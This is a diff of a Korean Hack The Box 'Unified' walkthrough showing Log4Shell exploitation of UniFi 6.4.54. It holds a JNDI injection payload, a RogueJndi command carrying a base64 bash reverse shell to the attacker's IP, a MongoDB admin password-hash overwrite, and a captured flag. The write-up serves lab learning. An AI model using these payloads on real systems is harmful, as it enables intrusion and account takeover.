@@ -14,7 +14,7 @@ sudo openvpn starting_point_<id>.ovpn
 
 * Spawn Machine | Click to Spawn the machine
 
-![machine]()
+![machine](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/machine.png)
 
 * Task 1 | Which are the first four open ports?
 
@@ -22,7 +22,7 @@ sudo openvpn starting_point_<id>.ovpn
 
 `nmap`을 사용해 포트 스캔을 한다.
 
-22번 ssh, 6789번 ibm db2, 8080번 http-proxy 8443번 ssl 서버가 열려있다.
+22번 ssh, 6789번 ibm db2, 8080번 http-proxy, 8443번 ssl 서버가 열려있다.
 
 ```
 ┌──(kali㉿kali)-[~/Unified]
@@ -98,9 +98,7 @@ nmap 결과로 알 수 있듯이 8443번 포트의 타이틀이 같이 나와있
 
 > 6.4.54
 
-열려있는 8443번 포트의 ssl 서버에 접속하기 위해 브라우저에 접속하면 연결되지 않는다.
-
-ssl은 https로 접속해야 한다. https://<Machine_IP>:8443
+열려있는 8443번 포트의 ssl 서버에 접속하기 위해 브라우저에 https로 접속한다. `https://<Machine_IP>:8443`
 
 파이어폭스로 접속 시 경고가 뜨지만 다음과 같이 눌러 진행하면 정상적으로 접속된다.
 
@@ -108,7 +106,7 @@ ssl은 https로 접속해야 한다. https://<Machine_IP>:8443
 
 접속된 사이트에서 버전정보를 알 수 있다.
 
-![https]()
+![https](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/https.png)
 
 * Task 4 | What is the CVE for the identified vulnerability?
 
@@ -136,17 +134,17 @@ tcpdump란 패킷 가로채기를 하는 소프트웨어이다.
 
 로그인 요청할 때 `remember` 데이터 값이 Log4j에 취약하다고 되어있다.
 
-https://github.com/puzzlepeaches/Log4jUnifi
+https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
 
 LDAP 서버를 사용하기 위해 우선 tcpdump로 패킷을 확인한다.
 
 burpsuite를 실행해 로그인 데이터를 인터셉트하여 Log4j 취약점 코드 `"${jndi:ldap://<IP>/o=tomcat}"`를 입력한다.
 
-![burp]()
+![burp](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/burp.png)
 
 패킷이 확인되었으니 UniFi 6.4.54 가 취약하다는 것이 명확해졌다.
 
-![tcpdump]()
+![tcpdump](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/tcpdump.png)
 
 * Task 7 | What port do we need to inspect intercepted traffic for?
 
@@ -164,38 +162,37 @@ cd rogue-jndi
 mvn package
 ```
 
-![jndi]()
+![jndi](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/jndi.png)
 
 위와 같이 입력하면 악성 LDAP 서버 실행 준비를 마쳤다.
 
 이제 리버스 쉘을 전달할 명령어를 만들어야 한다. 명령어를 base64로 인코딩한다.
 
-![base64]()
+![base64](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/base64.png)
 
 인코딩 값을 같이 입력하여 컴파일한다.
 
 ```
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTg0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.184"
-
 ```
 
-![jar]()
+![jar](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/jar.png)
 
-이때 매핑하고 있는 ldap 서버를 잘 보면 포트 값이 1389를 입력해 주고 있다.
+이때 매핑하고 있는 ldap 서버를 잘 보면 포트 값을 1389번으로 입력해 주고 있다.
 
 nc로 리버스 쉘 코드로 설정한 4444번 포트를 리스닝한다.
 
 그리고 다시 한번 로그인 페이지에서 remember 값에 Log4j 취약점 코드를 입력할 때 마지막 포트를 1389로 입력하여 Forward를 누르면 리버스 쉘을 얻을 수 있다.
 
-![1389]()
+![1389](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/1389.png)
 
-![shell]()
+![shell](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/shell.png)
 
 쉘을 보기 좋게 하기 위해 추가로 `script /dev/null -c bash` 명령어를 입력했다.
 
 그럼 MongoDB 서비스 포트를 확인하기 위해 실행되고 있는 프로세스를 확인하면 27117 포트로 실행되고 있는 것을 알 수 있다..
 
-![ps]()
+![ps](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/ps.png)
 
 * Task 9 | What is the default database name for UniFi applications?
 
@@ -207,7 +204,7 @@ nc로 리버스 쉘 코드로 설정한 4444번 포트를 리스닝한다.
 
 데이터베이스의 암호 해시를 덤프한다. 다음과 같이 입력하면 사용자와 권한과 암호 해시를 덤프할 수 있다.
 
-![admin]()
+![admin](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/admin.png)
 
 * Task 11 | What is the function we use to update users within the database in MongoDB?
 
@@ -217,7 +214,7 @@ x_shadow에 저장되어 있는 암호 해시 값을 해독하는 것은 너무�
 
 password의 해시 값을 준비한다.
 
-![mkpasswd]()
+![mkpasswd](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/mkpasswd.png)
 
 이제 준비한 해시 값을 아래와 같이 업데이트한다.
 
@@ -227,7 +224,7 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 
 성공적으로 업데이트가 된 것을 다시 find로 x_shadow 부분을 확인한다.
 
-![update]()
+![update](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/update.png)
 
 * Task 12 | What is the password for the root user?
 
@@ -235,11 +232,11 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 
 이제 변경된 계정 `administrator:password`으로 로그인한다.
 
-![login]()
+![login](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/login.png)
 
 이것저것 확인하던 중 Setting 메뉴에서 ssh 계정이 노출되어 있다.
 
-![setting]()
+![setting](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/setting.png)
 
 * Submit Flag | Submit user flag
 
@@ -247,16 +244,15 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 
 ssh로 로그인하면 root 플래그와 user 플래그를 모두 확인할 수 있다.
 
-![ssh]()
+![ssh](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/ssh.png)
 
-![user]()
+![user](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/user.png)
 
 * Submit Flag | Submit root flag 
 
 > e50bc93c75b634e4b272d2f771c33681
 
-![root]()
-
+![root](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/root.png)
 
 ## Reference
 * Kisa Log4j 위형 대응 보고서 : https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=36476
